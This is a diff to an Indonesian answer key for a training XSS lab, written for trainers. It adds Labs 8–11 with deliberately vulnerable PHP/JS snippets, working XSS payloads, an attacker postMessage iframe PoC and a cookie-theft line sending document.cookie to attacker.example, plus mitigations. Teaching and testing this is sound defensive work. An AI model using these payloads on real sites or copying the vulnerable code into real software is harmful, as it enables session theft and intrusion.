@@ -1,7 +1,7 @@
 # Kunci Jawaban — XSS Lab
 
 > 📌 **Untuk trainer/pendamping.** Dokumen ini berisi payload final, langkah lengkap, dan
-> penjelasan *kenapa* tiap payload berhasil untuk ke-7 lab di [README.md](README.md). Jangan
+> penjelasan *kenapa* tiap payload berhasil untuk ke-11 lab di [README.md](README.md). Jangan
 > dibagikan ke peserta sebelum sesi lab selesai.
 
 ---
@@ -191,6 +191,191 @@ halaman log/analytics admin.
 
 ---
 
+## Lab 8 — XSS via `javascript:` URI (`lab8_javascript_uri.php`)
+
+**Kode:**
+```php
+<a href="<?php echo htmlspecialchars($website, ENT_QUOTES); ?>">Kunjungi website saya</a>
+```
+`$website` (field "Website" pada form edit profil, disimpan di `$_SESSION`) memang di-escape
+dengan benar pakai `htmlspecialchars($website, ENT_QUOTES)` — jadi ini **bukan** bug
+missing-encoding seperti Lab 2. Tidak ada validasi bahwa nilainya harus diawali
+`http://`/`https://` (allowlist skema).
+
+**Payload:**
+```
+javascript:alert(document.domain)
+javascript:fetch('https://attacker.example/steal?c='+document.cookie)
+```
+
+**Kenapa berhasil:** string `javascript:alert(document.domain)` adalah nilai atribut HTML yang
+100% valid — tidak mengandung karakter `"`, `<`, `>`, atau apa pun yang perlu di-escape, jadi
+`htmlspecialchars()` tidak mengubahnya sama sekali dan tidak melihat ada yang salah. Tapi
+browser mendukung skema URI `javascript:` di mana pun URL biasa diterima, termasuk `href`.
+Begitu link diklik, browser menjalankan isi setelah `javascript:` sebagai kode JS dengan origin
+halaman ini — bukan menavigasi ke halaman baru. Ini adalah kelas bug yang benar-benar berbeda
+dari HTML-injection: kegagalannya ada di **validasi skema/allowlist**, bukan di encoding.
+
+**Langkah:**
+1. Isi field "Website" dengan salah satu payload di atas, submit form ("Simpan Profil").
+2. Profil tersimpan (session), muncul bagian "Preview profil Anda" dengan link "Kunjungi
+   website saya".
+3. Klik link tersebut → `alert()` (atau `fetch()` pencurian cookie) tereksekusi.
+
+**Hasil:** popup `alert()` muncul, atau — untuk payload kedua — cookie sesi korban terkirim ke
+server attacker begitu link diklik.
+
+---
+
+## Lab 9 — Stored XSS via upload avatar SVG (`lab9_svg_upload.php`)
+
+**Kode:**
+```php
+// VULNERABLE: tidak ada validasi content-type / magic byte sama sekali
+$name = time() . '_' . basename($_FILES['avatar']['name']);
+move_uploaded_file($_FILES['avatar']['tmp_name'], $uploadDir . '/' . $name);
+```
+```html
+<a href="data/uploads/<?php echo rawurlencode($uploaded_name); ?>" target="_blank">Lihat avatar saya (ukuran penuh)</a>
+```
+Atribut `accept="image/*"` pada `<input type="file">` hanyalah hint UI di browser (memfilter
+dialog pemilihan file) — tidak pernah dicek ulang di server. File apa pun (termasuk `.svg`)
+diterima dan disimpan apa adanya.
+
+**Payload — simpan sebagai `pwned.svg`:**
+```svg
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><text y="20">pwned</text></svg>
+```
+
+**Kenapa berhasil:** SVG adalah format berbasis XML, dan spesifikasinya mengizinkan tag
+`<script>` maupun atribut event handler seperti `onload` di dalam dokumen SVG. Ketika file SVG
+dibuka **langsung** lewat navigasi URL (`target="_blank"` ke `data/uploads/....svg`), browser
+merender dokumen itu sebagai dokumen aktif (bukan sekadar gambar statis) dan mengeksekusi
+`onload`-nya dengan origin situs yang meng-hosting file tersebut — beda dengan menaruh SVG di
+dalam tag `<img src="....svg">`, yang di kebanyakan browser modern mem-sandbox/menonaktifkan
+script di dalamnya.
+
+**Langkah:**
+1. Simpan payload di atas sebagai file `pwned.svg` di komputer.
+2. Upload lewat form "Avatar" di `lab9_svg_upload.php`.
+3. Klik link "Lihat avatar saya (ukuran penuh)" yang muncul setelah upload berhasil — ini
+   membuka file SVG-nya langsung di tab baru.
+
+**Hasil:** popup `alert(document.domain)` muncul di tab baru saat SVG selesai dimuat, karena
+browser mengeksekusi atribut `onload` pada elemen `<svg>` root.
+
+**Catatan cakupan:** lab ini fokus murni pada "SVG sebagai vektor XSS" (stored XSS lewat isi
+file), berbeda dari kategori File Upload di lab terpisah yang fokus ke bypass filter ekstensi
+untuk mencapai eksekusi PHP/RCE di server — di sini tidak ada kode PHP yang dieksekusi sama
+sekali, murni browser-side.
+
+---
+
+## Lab 10 — DOM-based XSS via postMessage (`lab10_postmessage_xss.php`)
+
+**Source & sink (murni client-side):**
+```js
+// VULNERABLE: tidak ada pengecekan event.origin, event.data ditulis langsung ke innerHTML
+window.addEventListener('message', function(event) {
+  document.getElementById('notify-area').innerHTML = event.data;
+});
+```
+
+**Halaman attacker PoC (`lab10_attacker_iframe.php`):**
+```js
+var iframe = document.getElementById('target'); // src="lab10_postmessage_xss.php"
+iframe.addEventListener('load', function() {
+  iframe.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');
+});
+```
+
+**Payload (dikirim lewat `postMessage`):**
+```html
+<img src=x onerror=alert(document.domain)>
+```
+
+**Kenapa berhasil:** `postMessage` adalah API resmi untuk komunikasi lintas-origin antar
+window/iframe. Penerima **wajib** memvalidasi `event.origin` terhadap allowlist domain
+tepercaya sebelum memproses `event.data` sama sekali — halaman ini tidak melakukan validasi
+apa pun, jadi domain mana pun (termasuk domain attacker) bisa mengirim pesan yang akan diterima
+dan diproses. Ditambah lagi, `event.data` ditulis langsung ke `innerHTML`, jadi begitu payload
+diterima, tag `<img>` di-parse sebagai HTML aktif dan `onerror` dipicu karena `src=x` gagal
+dimuat sebagai gambar.
+
+**Langkah:**
+1. Buka `lab10_attacker_iframe.php` langsung di browser (bukan dari nav, halaman ini memang
+   tidak dipasang di menu karena "bukan milik" aplikasi — mensimulasikan situs attacker
+   eksternal).
+2. Halaman itu meng-embed `lab10_postmessage_xss.php` di iframe dan otomatis mengirim payload
+   lewat `postMessage()` begitu iframe selesai dimuat.
+3. Amati iframe di halaman attacker — `alert()` muncul di dalamnya.
+
+**Hasil:** popup `alert(document.domain)` muncul di dalam iframe (menampilkan domain halaman
+korban `lab10_postmessage_xss.php`), membuktikan payload lintas-origin diterima dan dieksekusi
+tanpa validasi origin.
+
+**Poin diskusi:** bahkan jika origin *sudah* divalidasi, `innerHTML` tetap sink berbahaya —
+mitigasi lengkap butuh **dua** lapis: allowlist `event.origin` DAN `textContent`/sanitizer
+untuk `event.data`, bukan salah satu saja.
+
+---
+
+## Lab 11 — Reflected XSS meski ada CSP / unsafe-inline (`lab11_csp_bypass.php`)
+
+**Header yang dikirim:**
+```php
+header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';");
+```
+
+**Sink (identik dengan Lab 1):**
+```php
+Search results for: <?php echo $q; /* VULNERABLE: no htmlspecialchars() */ ?>
+```
+
+**Cara verifikasi header (sebelum submit payload):**
+```bash
+curl -i "http://localhost:8079/xss/lab11_csp_bypass.php?q=test"
+```
+Response menunjukkan `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';`.
+
+**Payload:**
+```
+?q=<script>alert(document.domain)</script>
+```
+
+**Kenapa berhasil:** CSP *ada* dan terkirim di header — sekilas terlihat seperti mitigasi XSS
+sudah terpasang. Tapi direktif `script-src` mengandung `'unsafe-inline'`, yang secara eksplisit
+mengizinkan `<script>` inline (dan atribut event handler inline seperti `onerror=...`) untuk
+tetap dieksekusi. `'unsafe-inline'` menghilangkan **persis** perlindungan utama yang biasanya
+diberikan CSP terhadap reflected/stored XSS berbasis inline script — jadi payload yang sama
+persis dengan Lab 1 tetap tereksekusi, CSP tidak menghalanginya sama sekali.
+
+**Langkah:**
+1. Jalankan `curl -i ...` di atas (atau cek tab Network → Response Headers di DevTools) untuk
+   melihat sendiri header CSP dan menemukan `'unsafe-inline'`.
+2. Submit payload `?q=<script>alert(document.domain)</script>` lewat form atau langsung di URL.
+3. Hubungkan dua temuan: CSP "ada", tapi konfigurasinya (`'unsafe-inline'`) membuatnya tidak
+   berfungsi untuk mencegah inline XSS.
+
+**Hasil:** popup `alert(document.domain)` tetap muncul walau `Content-Security-Policy` header
+terpasang di response.
+
+**Poin diskusi — CSP yang benar-benar keras (untuk dibandingkan):**
+```
+Content-Security-Policy: script-src 'self' 'nonce-RANDOM123'; object-src 'none'; base-uri 'self';
+```
+- `'nonce-...'` (nilai acak per-response, bukan `'unsafe-inline'`) — hanya `<script>` yang
+  membawa atribut `nonce` yang cocok yang diizinkan jalan; attacker yang tidak tahu nonce tidak
+  bisa menyuntikkan script yang dieksekusi.
+- `object-src 'none'` — blok vektor injeksi lewat `<object>`/`<embed>`/plugin.
+- `base-uri 'self'` — cegah attacker memanipulasi tag `<base>` untuk membajak resolusi URL
+  relatif di halaman (termasuk src script relatif).
+
+CSP hanya jadi lapisan defense-in-depth yang berarti kalau dikonfigurasi ketat (nonce/hash,
+tanpa `'unsafe-inline'`) — sekadar "header-nya ada" tidak sama dengan "terlindungi".
+
+---
+
 ## Ringkasan hasil akhir
 
 | Lab | Konteks | Payload final |
@@ -202,12 +387,23 @@ halaman log/analytics admin.
 | 5 | DOM (`innerHTML`) | `#<img src=x onerror=alert(document.domain)>` |
 | 6 | Filter bypass | `<svg onload=alert(1)>` (atau 3 varian lain di tabel atas) |
 | 7 | Header `User-Agent` | `curl -A "<script>alert(document.domain)</script>" ...` |
+| 8 | Atribut `href` (`javascript:`) | `javascript:alert(document.domain)` di field Website |
+| 9 | Stored (upload SVG) | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><text y="20">pwned</text></svg>` sebagai `pwned.svg` |
+| 10 | DOM (`postMessage` &rarr; `innerHTML`) | `<img src=x onerror=alert(document.domain)>` via `lab10_attacker_iframe.php` |
+| 11 | HTML body, CSP `unsafe-inline` | `<script>alert(document.domain)</script>` (sama seperti Lab 1) |
 
 ## Mitigasi (ringkas, lihat [README.md](README.md) untuk versi lengkap)
 - Contextual output encoding: `htmlspecialchars()` untuk HTML body & atribut, `json_encode()`
   untuk menyisipkan data ke JavaScript (bukan concatenation manual seperti Lab 3).
-- Content-Security-Policy untuk membatasi eksekusi inline script.
+- Content-Security-Policy untuk membatasi eksekusi inline script — dan pastikan **tidak**
+  memakai `'unsafe-inline'` di `script-src` (Lab 11), karena itu meniadakan proteksi utamanya.
 - `HttpOnly` cookie flag agar `document.cookie` tidak terbaca lewat XSS (Lab 4).
-- Untuk DOM-based (Lab 5): audit sink berbahaya (`innerHTML`, `document.write`, `eval`), pakai
-  `textContent` atau sanitizer seperti DOMPurify.
+- Untuk DOM-based (Lab 5, Lab 10): audit sink berbahaya (`innerHTML`, `document.write`,
+  `eval`), pakai `textContent` atau sanitizer seperti DOMPurify. Untuk `postMessage` (Lab 10),
+  validasi `event.origin` terhadap allowlist SEBELUM memproses `event.data` sama sekali.
 - Filter blacklist (Lab 6) selalu bisa dilewati — pakai encoding kontekstual atau allowlist.
+- Allowlist skema URL (`http:`/`https:`/`mailto:`) sebelum menyisipkan URL user-controlled ke
+  `href`/`src` — `htmlspecialchars()` saja tidak menangkap skema `javascript:` (Lab 8).
+- Validasi upload file di server (content-type & magic byte, bukan cuma `accept="..."` di
+  client), dan sajikan file yang diupload dari domain/subdomain terpisah tanpa cookie sesi
+  aplikasi utama untuk mencegah stored XSS lewat SVG/HTML yang diupload (Lab 9).
